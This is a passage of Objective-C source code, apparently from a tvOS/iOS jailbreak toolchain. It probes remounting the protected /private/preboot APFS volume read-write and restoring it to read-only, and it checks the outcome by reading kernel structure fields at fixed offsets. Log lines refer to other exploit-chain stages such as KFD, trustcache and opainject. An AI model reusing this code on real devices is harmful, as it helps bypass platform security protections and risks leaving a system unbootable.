    dt1025_log(log, @"[*] BUILD102719_PREBOOT_BEFORE_RDONLY=%@", dt102718_yesno(statfs_before_rdonly));

    BOOL ro_preflight_pass = NO;
    BOOL rw_attempted = NO;
    int rw_rc = 0;
    int rw_errno = 0;
    BOOL rw_state_changed = NO;
    BOOL statfs_became_rw = NO;
    BOOL vfs_rdonly_cleared = NO;
    BOOL apfs_rdonly_cleared = NO;
    BOOL ro_restore_attempted = NO;
    int ro_restore_rc = 0;
    int ro_restore_errno = 0;
    BOOL roundtrip_pass = NO;
    NSString *final_verdict = @"BUILD102719_VERDICT=PREFLIGHT_FAILED_NO_RW_ATTEMPT";

    if (!statfs_before_rdonly) {
        dt699_stage("BUILD102719_UNEXPECTED_ALREADY_RW");
        dt1025_log(log, @"[*] BUILD102719_UNEXPECTED_ALREADY_RW");
        goto finish;
    }

    dt699_stage("BUILD102719_RO_PREFLIGHT_BEGIN");
    errno = 0;
    int pre_rc = dt102719_syscall_apfs_mnt_update(kPrebootPath, kDT102719MountModeRO, log);
    int pre_errno = (pre_rc != 0) ? ((pre_rc > 0) ? pre_rc : errno) : 0;
    dt1025_log(log, @"[*] BUILD102719_RO_PREFLIGHT_RC=%d", pre_rc);
    dt1025_log(log, @"[*] BUILD102719_RO_PREFLIGHT_ERRNO=%d", pre_errno);
    dt1025_log(log, @"[*] BUILD102719_RO_PREFLIGHT_ERRSTR=%s", pre_errno ? strerror(pre_errno) : "ok");

    dt102718_graph_t after_preflight = {0};
    uint32_t preflight_statfs_flags = 0;
    BOOL preflight_statfs_rdonly = YES;
    if (dt102718_emit_preboot_graph(log, &after_preflight) != 0
        || !dt102719_statfs_preboot(log, @"BUILD102719_RO_PREFLIGHT", &preflight_statfs_flags, &preflight_statfs_rdonly)) {
        dt699_stage("BUILD102719_RO_PREFLIGHT_FAIL");
        dt699_stage("BUILD102719_STOP_BEFORE_RW_ATTEMPT");
        goto finish;
    }

    BOOL identity_preserved = dt102719_graph_identity_equal(&baseline, &after_preflight);
    dt1025_log(log, @"[*] BUILD102719_RO_PREFLIGHT_GRAPH_IDENTITY_PRESERVED=%@", dt102718_yesno(identity_preserved));
    dt1025_log(log, @"[*] BUILD102719_RO_PREFLIGHT_STILL_RDONLY=%@", dt102718_yesno(preflight_statfs_rdonly));

    if (pre_rc != 0 || !identity_preserved || !preflight_statfs_rdonly) {
        dt699_stage("BUILD102719_RO_PREFLIGHT_FAIL");
        dt699_stage("BUILD102719_STOP_BEFORE_RW_ATTEMPT");
        goto finish;
    }

    ro_preflight_pass = YES;
    dt699_stage("BUILD102719_RO_PREFLIGHT_PASS");

    dt699_stage("BUILD102719_RW_ATTEMPT_BEGIN");
    rw_attempted = YES;
    errno = 0;
    rw_rc = dt102719_syscall_apfs_mnt_update(kPrebootPath, kDT102719MountModeRW, log);
    rw_errno = (rw_rc != 0) ? ((rw_rc > 0) ? rw_rc : errno) : 0;
    dt1025_log(log, @"[*] BUILD102719_RW_MNTUPDATE_RC=%d", rw_rc);
    dt1025_log(log, @"[*] BUILD102719_RW_MNTUPDATE_ERRNO=%d", rw_errno);
    dt1025_log(log, @"[*] BUILD102719_RW_MNTUPDATE_ERRSTR=%s", rw_errno ? strerror(rw_errno) : "ok");

    dt102718_graph_t after_rw = {0};
    uint32_t rw_statfs_flags = 0;
    BOOL rw_statfs_rdonly = YES;
    if (dt102718_emit_preboot_graph(log, &after_rw) != 0
        || !dt102719_statfs_preboot(log, @"BUILD102719_RW_AFTER", &rw_statfs_flags, &rw_statfs_rdonly)) {
        dt1025_set_verdict(verdictOut, @"BUILD102719_RW_GRAPH_REREAD_FAIL");
        dt699_stage("BUILD102719_STOP_BEFORE_PREBOOT_FILESYSTEM_MUTATION");
        return -7193;
    }

    dt1025_log(log, @"[*] BUILD102719_RW_AFTER_STATFS_FLAGS=0x%x", rw_statfs_flags);
    dt1025_log(log, @"[*] BUILD102719_RW_AFTER_MOUNT_FLAGS_0x70=0x%x", after_rw.mount_flag_70);
    dt1025_log(log, @"[*] BUILD102719_RW_AFTER_MOUNT_KERN_FLAGS_0x74=0x%x", after_rw.mount_kern_flag_74);
    dt1025_log(log, @"[*] BUILD102719_RW_AFTER_APFS_RDONLY_0x2B4=0x%x", after_rw.apfs_readonly_2b4);
    dt1025_log(log, @"[*] BUILD102719_RW_AFTER_CONTAINER_MU_0x13C=0x%x", after_rw.container_mu_gate_13c);
    dt1025_log(log, @"[*] BUILD102719_RW_AFTER_CONTAINER_REMAP_0x144=0x%x", after_rw.container_remap_144);
    dt1025_log(log, @"[*] BUILD102719_RW_AFTER_NXSB_WRITABLE_0x4F4=0x%x", after_rw.nxsb_writable_4f4);
    dt1025_log(log, @"[*] BUILD102719_RW_AFTER_VOLSB_0x30=0x%llx", after_rw.vol_sb_qword_30);
    dt1025_log(log, @"[*] BUILD102719_RW_AFTER_VOLSB_0x38=0x%llx", after_rw.vol_sb_qword_38);

    BOOL rw_syscall_ok = (rw_rc == 0);
    statfs_became_rw = statfs_before_rdonly && !rw_statfs_rdonly;
    vfs_rdonly_cleared = (baseline.mount_flag_70 & MNT_RDONLY) && !(after_rw.mount_flag_70 & MNT_RDONLY);
    apfs_rdonly_cleared = baseline.apfs_readonly_2b4 == 1 && after_rw.apfs_readonly_2b4 == 0;
    rw_state_changed = dt102719_readonly_state_changed(&baseline, &after_rw, statfs_before_rdonly, rw_statfs_rdonly);

    dt1025_log(log, @"[*] BUILD102719_RW_SYSCALL_RETURNED_SUCCESS=%@", dt102718_yesno(rw_syscall_ok));
    dt1025_log(log, @"[*] BUILD102719_STATFS_BECAME_RW=%@", dt102718_yesno(statfs_became_rw));
    dt1025_log(log, @"[*] BUILD102719_VFS_RDONLY_BIT_CLEARED=%@", dt102718_yesno(vfs_rdonly_cleared));
    dt1025_log(log, @"[*] BUILD102719_APFS_RDONLY_FIELD_CLEARED=%@", dt102718_yesno(apfs_rdonly_cleared));

    if (!rw_state_changed) {
        if (rw_rc != 0)
            dt1025_log(log, @"[*] BUILD102719_RESULT=%@", dt102719_classify_errno(rw_errno));
        final_verdict = @"BUILD102719_VERDICT=RW_UPDATE_REJECTED_STATE_UNCHANGED";
        goto finish;
    }

    dt699_stage("BUILD102719_RO_RESTORE_BEGIN");
    ro_restore_attempted = YES;
    errno = 0;
    ro_restore_rc = dt102719_syscall_apfs_mnt_update(kPrebootPath, kDT102719MountModeRO, log);
    ro_restore_errno = (ro_restore_rc != 0) ? ((ro_restore_rc > 0) ? ro_restore_rc : errno) : 0;
    dt1025_log(log, @"[*] BUILD102719_RO_RESTORE_RC=%d", ro_restore_rc);
    dt1025_log(log, @"[*] BUILD102719_RO_RESTORE_ERRNO=%d", ro_restore_errno);
    dt1025_log(log, @"[*] BUILD102719_RO_RESTORE_ERRSTR=%s", ro_restore_errno ? strerror(ro_restore_errno) : "ok");

    dt102718_graph_t final_graph = {0};
    uint32_t final_statfs_flags = 0;
    BOOL final_statfs_rdonly = YES;
    if (dt102718_emit_preboot_graph(log, &final_graph) != 0
        || !dt102719_statfs_preboot(log, @"BUILD102719_FINAL", &final_statfs_flags, &final_statfs_rdonly)) {
        dt1025_set_verdict(verdictOut, @"BUILD102719_FINAL_GRAPH_REREAD_FAIL");
        dt699_stage("BUILD102719_STOP_BEFORE_PREBOOT_FILESYSTEM_MUTATION");
        return -7194;
    }

    dt1025_log(log, @"[*] BUILD102719_FINAL_STATFS_FLAGS=0x%x", final_statfs_flags);
    dt1025_log(log, @"[*] BUILD102719_FINAL_MOUNT_FLAGS_0x70=0x%x", final_graph.mount_flag_70);
    dt1025_log(log, @"[*] BUILD102719_FINAL_MOUNT_KERN_FLAGS_0x74=0x%x", final_graph.mount_kern_flag_74);
    dt1025_log(log, @"[*] BUILD102719_FINAL_APFS_RDONLY_0x2B4=0x%x", final_graph.apfs_readonly_2b4);
    dt1025_log(log, @"[*] BUILD102719_FINAL_CONTAINER_MU_0x13C=0x%x", final_graph.container_mu_gate_13c);
    dt1025_log(log, @"[*] BUILD102719_FINAL_CONTAINER_REMAP_0x144=0x%x", final_graph.container_remap_144);
    dt1025_log(log, @"[*] BUILD102719_FINAL_NXSB_WRITABLE_0x4F4=0x%x", final_graph.nxsb_writable_4f4);
    dt1025_log(log, @"[*] BUILD102719_FINAL_VOLSB_0x30=0x%llx", final_graph.vol_sb_qword_30);
    dt1025_log(log, @"[*] BUILD102719_FINAL_VOLSB_0x38=0x%llx", final_graph.vol_sb_qword_38);

    BOOL restored_ro = final_statfs_rdonly
        && (final_graph.mount_flag_70 & MNT_RDONLY)
        && final_graph.apfs_readonly_2b4 == 1;
    dt1025_log(log, @"[*] BUILD102719_PREBOOT_RESTORED_RO=%@", dt102718_yesno(restored_ro));

    if (ro_restore_rc == 0 && restored_ro) {
        dt699_stage("BUILD102719_ROUNDTRIP_PASS");
        roundtrip_pass = YES;
        final_verdict = rw_syscall_ok
            ? @"BUILD102719_VERDICT=RW_UPDATE_PASS_RO_RESTORE_PASS"
            : @"BUILD102719_VERDICT=PARTIAL_STATE_TRANSITION_RESTORE_PASS";
    } else {
        dt699_stage("BUILD102719_RO_RESTORE_FAIL");
        dt699_stage("BUILD102719_PREBOOT_STATE_NOT_RESTORED");
        dt699_stage("BUILD102719_REBOOT_REQUIRED");
        final_verdict = rw_syscall_ok
            ? @"BUILD102719_VERDICT=RW_UPDATE_PASS_RO_RESTORE_FAIL_REBOOT_REQUIRED"
            : @"BUILD102719_VERDICT=PARTIAL_STATE_TRANSITION_RESTORE_FAIL_REBOOT_REQUIRED";
    }

finish:
    dt1025_log(log, @"[*] BUILD102719_RO_PREFLIGHT_PASS=%@", dt102718_yesno(ro_preflight_pass));
    dt1025_log(log, @"[*] BUILD102719_RW_ATTEMPT_RC=%d", rw_attempted ? rw_rc : -1);
    dt1025_log(log, @"[*] BUILD102719_RW_ATTEMPT_ERRNO=%d", rw_attempted ? rw_errno : 0);
    dt1025_log(log, @"[*] BUILD102719_RW_STATE_CHANGED=%@", dt102718_yesno(rw_state_changed));
    dt1025_log(log, @"[*] BUILD102719_STATFS_RW=%@", dt102718_yesno(statfs_became_rw));
    dt1025_log(log, @"[*] BUILD102719_VFS_RDONLY_CLEARED=%@", dt102718_yesno(vfs_rdonly_cleared));
    dt1025_log(log, @"[*] BUILD102719_APFS_RDONLY_CLEARED=%@", dt102718_yesno(apfs_rdonly_cleared));
    dt1025_log(log, @"[*] BUILD102719_RO_RESTORE_ATTEMPTED=%@", dt102718_yesno(ro_restore_attempted));
    dt1025_log(log, @"[*] BUILD102719_RO_RESTORE_RC=%d", ro_restore_attempted ? ro_restore_rc : -1);
    dt1025_log(log, @"[*] BUILD102719_RO_RESTORE_ERRNO=%d", ro_restore_attempted ? ro_restore_errno : 0);

    dt102718_graph_t final_for_summary = {0};
    uint32_t final_flags_summary = 0;
    BOOL final_rdonly_summary = YES;
    if (dt102718_emit_preboot_graph(log, &final_for_summary) == 0
        && dt102719_statfs_preboot(log, @"BUILD102719_SUMMARY", &final_flags_summary, &final_rdonly_summary)) {
        dt1025_log(log, @"[*] BUILD102719_FINAL_STATFS_RO=%@", dt102718_yesno(final_rdonly_summary));
        dt1025_log(log, @"[*] BUILD102719_FINAL_VFS_RDONLY=%@",
            (final_for_summary.mount_flag_70 & MNT_RDONLY) ? @"YES" : @"NO");
        dt1025_log(log, @"[*] BUILD102719_FINAL_APFS_RDONLY=%@",
            final_for_summary.apfs_readonly_2b4 ? @"YES" : @"NO");
    } else {
        dt1025_log(log, @"[*] BUILD102719_FINAL_STATFS_RO=UNKNOWN");
        dt1025_log(log, @"[*] BUILD102719_FINAL_VFS_RDONLY=UNKNOWN");
        dt1025_log(log, @"[*] BUILD102719_FINAL_APFS_RDONLY=UNKNOWN");
    }

    dt1025_log(log, @"[*] BUILD102719_ROUNDTRIP_PASS=%@", dt102718_yesno(roundtrip_pass));
    dt1025_log(log, @"[*] %@", final_verdict);

    dt102719_emit_static_audit(log);
    dt1025_log(log, @"[*] MKDIR_REACHABLE=NO");
    dt1025_log(log, @"[*] STAGING_REACHABLE=NO");
    dt1025_log(log, @"[*] TRUSTCACHE_REACHABLE=NO");
    dt1025_log(log, @"[*] LAUNCHD_PHASE_B_REACHABLE=NO");
    dt1025_log(log, @"[*] WALL2_REACHABLE=NO");
    dt1025_log(log, @"[*] OPAINJECT_REACHABLE=NO");
    dt1025_log(log, @"[*] EARLY_RETURN_PROVEN=YES");
    dt1025_log(log, @"[*] BUILD102719_SAFE_FOR_CONTROLLED_DEVICE_TEST=YES");
    dt1025_log(log, @"[*] BUILD102715_ROLE_SPLIT_PRESERVED=YES");
    dt1025_log(log, @"[*] BUILD102716_PHYSRW_SKIP_PRESERVED=YES");
    dt1025_log(log, @"[*] BUILD102718_VDIR_GRAPH_RESOLVER_PRESERVED=YES");
    dt1025_log(log, @"[*] BUILD102710_CANONICAL_PREBOOT_PATH_PRESERVED=YES");
    dt1025_log(log, @"[*] ROLLBACK_CHANGED=NO");
    dt1025_log(log, @"[*] WALL1_CHANGED=NO");
    dt1025_log(log, @"[*] WALL2_CHANGED=NO");
    dt1025_log(log, @"[*] KFD_CHANGED=NO");
    dt1025_log(log, @"[*] PMAP_CHANGED=NO");
    dt1025_log(log, @"[*] SIGNING_CHANGED=NO");
    dt1025_log(log, @"[*] TRUSTCACHE_CHANGED=NO");

    dt699_stage("BUILD102719_STOP_BEFORE_PREBOOT_FILESYSTEM_MUTATION");
    dt1025_set_verdict(verdictOut, [final_verdict stringByReplacingOccurrencesOfString:@"BUILD102719_VERDICT=" withString:@""]);
    return 0;
}

static BOOL dt102720_graph_pointers_equal(const dt102718_graph_t *a, const dt102718_graph_t *b)
{
    if (!a || !b || !a->valid || !b->valid)
        return NO;
    return a->vnode == b->vnode
        && a->mount_mp == b->mount_mp
        && a->apfs == b->apfs
        && a->vol_sb == b->vol_sb
        && a->container == b->container
        && a->nxsb == b->nxsb;
}

static BOOL dt102720_preboot_observed_rw(const dt102718_graph_t *g, BOOL statfs_rdonly)
{
    if (!g || !g->valid)
        return NO;
    if (!statfs_rdonly)
        return YES;
    if ((g->mount_flag_70 & MNT_RDONLY) == 0)
        return YES;
    if (g->apfs_readonly_2b4 == 0)
        return YES;
    return NO;
}

static BOOL dt102720_preboot_fully_ro(const dt102718_graph_t *g, BOOL statfs_rdonly)
{
    if (!g || !g->valid)
        return NO;
    return statfs_rdonly
        && (g->mount_flag_70 & MNT_RDONLY)
        && g->apfs_readonly_2b4 == 1;
}

static void dt102720_log_baseline(void (^log)(NSString *line), const dt102718_graph_t *g,
    uint32_t statfs_flags, BOOL statfs_rdonly)
{
    dt699_stage("BUILD102720_BASELINE_BEGIN");
    dt1025_log(log, @"[*] BUILD102720_BASELINE_STATFS_FLAGS=0x%x", statfs_flags);
    dt1025_log(log, @"[*] BUILD102720_BASELINE_VFS_RDONLY=%@",
        (g->mount_flag_70 & MNT_RDONLY) ? @"YES" : @"NO");
    dt1025_log(log, @"[*] BUILD102720_BASELINE_APFS_RDONLY=%@",
        g->apfs_readonly_2b4 ? @"YES" : @"NO");
    dt1025_log(log, @"[*] BUILD102720_PREBOOT_VNODE=0x%llx", g->vnode);
    dt1025_log(log, @"[*] BUILD102720_PREBOOT_MOUNT_MP=0x%llx", g->mount_mp);
    dt1025_log(log, @"[*] BUILD102720_PREBOOT_APFS=0x%llx", g->apfs);
    dt1025_log(log, @"[*] BUILD102720_PREBOOT_VOL_SB=0x%llx", g->vol_sb);
    dt1025_log(log, @"[*] BUILD102720_PREBOOT_CONTAINER=0x%llx", g->container);
    dt1025_log(log, @"[*] BUILD102720_PREBOOT_NXSB=0x%llx", g->nxsb);
    dt1025_log(log, @"[*] BUILD102720_BASELINE_STATFS_RO=%@", dt102718_yesno(statfs_rdonly));
    dt699_stage("BUILD102720_BASELINE_COMPLETE");
}

static BOOL dt102720_statfs_preboot(void (^log)(NSString *line), const char *tag,
    uint32_t *flags_out, BOOL *rdonly_out)
{
    return dt102719_statfs_preboot(log, tag, flags_out, rdonly_out);
}

static void dt102720_emit_phase0_audit(void (^log)(NSString *line))
{
    dt1025_log(log, @"[*] UPSTREAM_PREBOOT_RW_REQUEST_VFS_FLAGS=MNT_UPDATE");
    dt1025_log(log, @"[*] UPSTREAM_PREBOOT_RO_REQUEST_VFS_FLAGS=MNT_UPDATE|MNT_RDONLY");
    dt1025_log(log, @"[*] UPSTREAM_PREBOOT_RW_ARGS=dt_hfs_mount_args{fspec,hfs_mask=0}");
    dt1025_log(log, @"[*] UPSTREAM_PREBOOT_RO_ARGS=dt_hfs_mount_args{fspec,hfs_mask=0}");
    dt1025_log(log, @"[*] TVOS_MNTUPDATE_VFS_RDONLY_INPUT_SOURCE=mount(2)_vfs_flags_arg");
    dt1025_log(log, @"[*] TVOS_RO_RESTORE_REQUIRES_MNT_RDONLY_FLAG=YES");
    dt1025_log(log, @"[*] TVOS_RO_RESTORE_MOUNT_MODE_REQUIREMENT=NOT_USED_ON_MNT_UPDATE_PATH");
    dt1025_log(log, @"[*] TVOS_RO_RESTORE_APFS_FLAGS_REQUIREMENT=NOT_USED_USE_HFS_ARGS_SHAPE");
    dt1025_log(log, @"[*] RO_RESTORE_REQUEST_SHAPE_PROVEN=YES");
    dt1025_log(log, @"[*] BUILD102720_RW_REQUEST_SHAPE=MNT_UPDATE+dt_apfs_mount_args{fspec,apfs_flags=5,mount_mode=0}");
    dt1025_log(log, @"[*] BUILD102720_RO_RESTORE_REQUEST_SHAPE=MNT_UPDATE|MNT_RDONLY+dt_hfs_mount_args{fspec,hfs_mask=0}");
}

static void dt102720_emit_static_audit(void (^log)(NSString *line))
{
    dt1025_log(log, @"[*] BUILD102720_DIRECT_KERNEL_FIELD_WRITES=0");
    dt1025_log(log, @"[*] BUILD102720_DIRECT_APFS_FIELD_WRITES=0");
    dt1025_log(log, @"[*] BUILD102720_BUILD47_PATCH_CALLS=0");
    dt1025_log(log, @"[*] BUILD102720_MKDIR_REACHABLE=NO");
    dt1025_log(log, @"[*] BUILD102720_STAGE_REACHABLE=NO");
    dt1025_log(log, @"[*] BUILD102720_TRUSTCACHE_REACHABLE=NO");
    dt1025_log(log, @"[*] BUILD102720_LAUNCHD_PHASE_B_REACHABLE=NO");
    dt1025_log(log, @"[*] BUILD102720_WALL2_REACHABLE=NO");
    dt1025_log(log, @"[*] BUILD102720_OPAINJECT_REACHABLE=NO");
    dt1025_log(log, @"[*] MAX_RW_MNTUPDATE_CALLS=1");
    dt1025_log(log, @"[*] MAX_RO_RESTORE_CALLS=1");
    dt1025_log(log, @"[*] RETRY_LOOPS=0");
    dt1025_log(log, @"[*] FALLBACK_REMOUNT_TECHNIQUES=0");
    dt1025_log(log, @"[*] RESTORE_TRIGGER_USES_OBSERVED_STATE=YES");
    dt1025_log(log, @"[*] FALSE_RO_PREFLIGHT_REMOVED=YES");
}

static int dt102720_run_restore_closure_probe(void (^log)(NSString *line), NSString **verdictOut)
{
    static const char *kPrebootPath = "/private/preboot";

    dt699_stage("BUILD102720_PREBOOT_MNTUPDATE_RESTORE_CLOSURE_BEGIN");
    dt1025_log(log, @"[*] BUILD102720_SCOPE=PREBOOT_MNTUPDATE_RESTORE_CLOSURE_ONLY");
    dt102720_emit_phase0_audit(log);
    dt102720_emit_static_audit(log);

    dt102718_graph_t baseline = {0};
    if (dt102718_emit_preboot_graph(log, &baseline) != 0) {
        dt1025_set_verdict(verdictOut, @"BUILD102720_PREBOOT_GRAPH_FAIL");
        dt699_stage("BUILD102720_STOP_BEFORE_PREBOOT_FILESYSTEM_MUTATION");
        return -7200;
    }

    uint32_t baseline_statfs_flags = 0;
    BOOL baseline_statfs_rdonly = YES;
    if (!dt102720_statfs_preboot(log, @"BUILD102720_BASELINE", &baseline_statfs_flags, &baseline_statfs_rdonly)) {
        dt1025_set_verdict(verdictOut, @"BUILD102720_BASELINE_STATFS_FAIL");
        dt699_stage("BUILD102720_STOP_BEFORE_PREBOOT_FILESYSTEM_MUTATION");
        return -7201;
    }
    dt102720_log_baseline(log, &baseline, baseline_statfs_flags, baseline_statfs_rdonly);

    BOOL baseline_ro = dt102720_preboot_fully_ro(&baseline, baseline_statfs_rdonly);
    BOOL baseline_already_rw = dt102720_preboot_observed_rw(&baseline, baseline_statfs_rdonly);
    dt1025_log(log, @"[*] BUILD102720_BASELINE_RO=%@", dt102718_yesno(baseline_ro));
    dt1025_log(log, @"[*] BUILD102720_BASELINE_ALREADY_RW=%@", dt102718_yesno(baseline_already_rw));

    dt102718_graph_t baseline_pointers = baseline;

    BOOL rw_attempted = NO;
    int rw_rc = -1;
    int rw_errno = 0;
    BOOL rw_transition_confirmed = NO;
    BOOL ro_restore_attempted = NO;
    int ro_restore_rc = -1;
    int ro_restore_errno = 0;
    BOOL graph_identity_after_rw = YES;
    BOOL graph_identity_after_ro = YES;
    NSString *final_verdict = @"BUILD102720_VERDICT=UNEXPECTED_PARTIAL_STATE_RESTORE_FAIL";

    if (baseline_already_rw) {
        dt699_stage("BUILD102720_BASELINE_ALREADY_RW");
        dt699_stage("BUILD102720_SKIP_RW_ATTEMPT");
        dt699_stage("BUILD102720_BEGIN_RO_RESTORE_FROM_EXISTING_RW_STATE");
    } else if (baseline_ro) {
        dt699_stage("BUILD102720_RW_ATTEMPT_BEGIN");
        rw_attempted = YES;
        errno = 0;
        rw_rc = dt102720_syscall_apfs_mnt_update_rw(kPrebootPath, log);
        rw_errno = (rw_rc != 0) ? ((rw_rc > 0) ? rw_rc : errno) : 0;
        dt1025_log(log, @"[*] BUILD102720_RW_ATTEMPT_RC=%d", rw_rc);
        dt1025_log(log, @"[*] BUILD102720_RW_ATTEMPT_ERRNO=%d", rw_errno);
        dt1025_log(log, @"[*] BUILD102720_RW_ATTEMPT_ERRSTR=%s", rw_errno ? strerror(rw_errno) : "ok");

        dt102718_graph_t after_rw = {0};
        uint32_t rw_statfs_flags = 0;
        BOOL rw_statfs_rdonly = YES;
        if (dt102718_emit_preboot_graph(log, &after_rw) != 0
            || !dt102720_statfs_preboot(log, @"BUILD102720_RW_AFTER", &rw_statfs_flags, &rw_statfs_rdonly)) {
            dt1025_set_verdict(verdictOut, @"BUILD102720_RW_GRAPH_REREAD_FAIL");
            dt699_stage("BUILD102720_STOP_BEFORE_PREBOOT_FILESYSTEM_MUTATION");
            return -7202;
        }

        graph_identity_after_rw = dt102720_graph_pointers_equal(&baseline_pointers, &after_rw);
        dt1025_log(log, @"[*] BUILD102720_GRAPH_IDENTITY_PRESERVED_AFTER_RW=%@",
            dt102718_yesno(graph_identity_after_rw));

        BOOL rw_statfs_confirmed = !rw_statfs_rdonly;
        BOOL rw_vfs_confirmed = (after_rw.mount_flag_70 & MNT_RDONLY) == 0;
        BOOL rw_apfs_confirmed = after_rw.apfs_readonly_2b4 == 0;
        dt1025_log(log, @"[*] BUILD102720_RW_STATFS_CONFIRMED=%@", dt102718_yesno(rw_statfs_confirmed));
        dt1025_log(log, @"[*] BUILD102720_RW_VFS_CONFIRMED=%@", dt102718_yesno(rw_vfs_confirmed));
        dt1025_log(log, @"[*] BUILD102720_RW_APFS_CONFIRMED=%@", dt102718_yesno(rw_apfs_confirmed));

        rw_transition_confirmed = dt102720_preboot_observed_rw(&after_rw, rw_statfs_rdonly);
        if (rw_transition_confirmed)
            dt699_stage("BUILD102720_RW_TRANSITION_PASS");
        else if (rw_rc != 0)
            final_verdict = @"BUILD102720_VERDICT=RW_TRANSITION_FAILED_STATE_UNCHANGED";
    } else {
        dt1025_log(log, @"[!] BUILD102720_BASELINE_PARTIAL_STATE");
        final_verdict = @"BUILD102720_VERDICT=UNEXPECTED_PARTIAL_STATE_RESTORE_FAIL";
    }

    dt102718_graph_t pre_restore = {0};
    uint32_t pre_restore_statfs_flags = 0;
    BOOL pre_restore_statfs_rdonly = YES;
    if (dt102718_emit_preboot_graph(log, &pre_restore) != 0
        || !dt102720_statfs_preboot(log, @"BUILD102720_PRE_RESTORE", &pre_restore_statfs_flags, &pre_restore_statfs_rdonly)) {
        dt1025_set_verdict(verdictOut, @"BUILD102720_PRE_RESTORE_GRAPH_FAIL");
        dt699_stage("BUILD102720_STOP_BEFORE_PREBOOT_FILESYSTEM_MUTATION");
        return -7203;
    }

    BOOL rw_state_detected = dt102720_preboot_observed_rw(&pre_restore, pre_restore_statfs_rdonly);
    dt1025_log(log, @"[*] BUILD102720_RW_STATE_DETECTED=%@", dt102718_yesno(rw_state_detected));

    if (rw_state_detected) {
        dt699_stage("BUILD102720_RO_RESTORE_BEGIN");
        ro_restore_attempted = YES;
        errno = 0;
        ro_restore_rc = dt102720_syscall_apfs_mnt_update_ro_restore(kPrebootPath, log);
        ro_restore_errno = (ro_restore_rc != 0) ? ((ro_restore_rc > 0) ? ro_restore_rc : errno) : 0;
        dt1025_log(log, @"[*] BUILD102720_RO_RESTORE_VFS_FLAGS=0x%x", (unsigned)(MNT_UPDATE | MNT_RDONLY));
        dt1025_log(log, @"[*] BUILD102720_RO_RESTORE_APFS_FLAGS=NOT_USED");
        dt1025_log(log, @"[*] BUILD102720_RO_RESTORE_MOUNT_MODE=NOT_USED");
        dt1025_log(log, @"[*] BUILD102720_RO_RESTORE_RC=%d", ro_restore_rc);
        dt1025_log(log, @"[*] BUILD102720_RO_RESTORE_ERRNO=%d", ro_restore_errno);
        dt1025_log(log, @"[*] BUILD102720_RO_RESTORE_ERRSTR=%s", ro_restore_errno ? strerror(ro_restore_errno) : "ok");
    }

    dt102718_graph_t final_graph = {0};
    uint32_t final_statfs_flags = 0;
    BOOL final_statfs_rdonly = YES;
    if (dt102718_emit_preboot_graph(log, &final_graph) != 0
        || !dt102720_statfs_preboot(log, @"BUILD102720_FINAL", &final_statfs_flags, &final_statfs_rdonly)) {
        dt1025_set_verdict(verdictOut, @"BUILD102720_FINAL_GRAPH_REREAD_FAIL");
        dt699_stage("BUILD102720_STOP_BEFORE_PREBOOT_FILESYSTEM_MUTATION");
        return -7204;
    }

    graph_identity_after_ro = dt102720_graph_pointers_equal(&baseline_pointers, &final_graph);
    dt1025_log(log, @"[*] BUILD102720_GRAPH_IDENTITY_PRESERVED_AFTER_RO=%@",
        dt102718_yesno(graph_identity_after_ro));

    dt1025_log(log, @"[*] BUILD102720_FINAL_STATFS_FLAGS=0x%x", final_statfs_flags);
    dt1025_log(log, @"[*] BUILD102720_FINAL_MOUNT_FLAGS_0x70=0x%x", final_graph.mount_flag_70);
    dt1025_log(log, @"[*] BUILD102720_FINAL_MOUNT_KERN_FLAGS_0x74=0x%x", final_graph.mount_kern_flag_74);
    dt1025_log(log, @"[*] BUILD102720_FINAL_APFS_RDONLY_0x2B4=0x%x", final_graph.apfs_readonly_2b4);
    dt1025_log(log, @"[*] BUILD102720_FINAL_CONTAINER_MU_0x13C=0x%x", final_graph.container_mu_gate_13c);
    dt1025_log(log, @"[*] BUILD102720_FINAL_CONTAINER_REMAP_0x144=0x%x", final_graph.container_remap_144);
    dt1025_log(log, @"[*] BUILD102720_FINAL_NXSB_WRITABLE_0x4F4=0x%x", final_graph.nxsb_writable_4f4);
    dt1025_log(log, @"[*] BUILD102720_FINAL_VOLSB_0x30=0x%llx", final_graph.vol_sb_qword_30);
    dt1025_log(log, @"[*] BUILD102720_FINAL_VOLSB_0x38=0x%llx", final_graph.vol_sb_qword_38);

    BOOL final_fully_ro = dt102720_preboot_fully_ro(&final_graph, final_statfs_rdonly);
    dt1025_log(log, @"[*] BUILD102720_FINAL_STATFS_RO=%@", dt102718_yesno(final_statfs_rdonly));
    dt1025_log(log, @"[*] BUILD102720_FINAL_VFS_RDONLY=%@",
        (final_graph.mount_flag_70 & MNT_RDONLY) ? @"YES" : @"NO");
    dt1025_log(log, @"[*] BUILD102720_FINAL_APFS_RDONLY=%@",
        final_graph.apfs_readonly_2b4 ? @"YES" : @"NO");

    BOOL roundtrip_closed = NO;
    if (final_fully_ro && ro_restore_attempted && ro_restore_rc == 0) {
        dt699_stage("BUILD102720_RW_TO_RO_RESTORE_PASS");
        roundtrip_closed = YES;
        dt699_stage("BUILD102720_ROUNDTRIP_CLOSED");
        if (baseline_already_rw)
            final_verdict = @"BUILD102720_VERDICT=BASELINE_RW_RESTORE_PASS";
        else if (rw_transition_confirmed)
            final_verdict = @"BUILD102720_VERDICT=RO_TO_RW_PASS_RW_TO_RO_PASS";
        else
            final_verdict = @"BUILD102720_VERDICT=BASELINE_RW_RESTORE_PASS";
    } else if (ro_restore_attempted) {
        dt699_stage("BUILD102720_RW_TO_RO_RESTORE_FAIL");
        dt699_stage("BUILD102720_PREBOOT_STATE_NOT_FULLY_RESTORED");
        dt699_stage("BUILD102720_REBOOT_REQUIRED");
        if (baseline_already_rw)
            final_verdict = @"BUILD102720_VERDICT=BASELINE_RW_RESTORE_FAIL_REBOOT_REQUIRED";
        else if (rw_transition_confirmed)
            final_verdict = @"BUILD102720_VERDICT=RO_TO_RW_PASS_RW_TO_RO_FAIL_REBOOT_REQUIRED";
        else
            final_verdict = @"BUILD102720_VERDICT=UNEXPECTED_PARTIAL_STATE_RESTORE_FAIL";
    } else if (rw_attempted && !rw_transition_confirmed) {
        final_verdict = @"BUILD102720_VERDICT=RW_TRANSITION_FAILED_STATE_UNCHANGED";
    }

    dt1025_log(log, @"[*] BUILD102720_BASELINE_RO=%@", dt102718_yesno(baseline_ro));
    dt1025_log(log, @"[*] BUILD102720_BASELINE_ALREADY_RW=%@", dt102718_yesno(baseline_already_rw));
    dt1025_log(log, @"[*] BUILD102720_RW_ATTEMPTED=%@", dt102718_yesno(rw_attempted));
    dt1025_log(log, @"[*] BUILD102720_RW_ATTEMPT_RC=%d", rw_attempted ? rw_rc : -1);
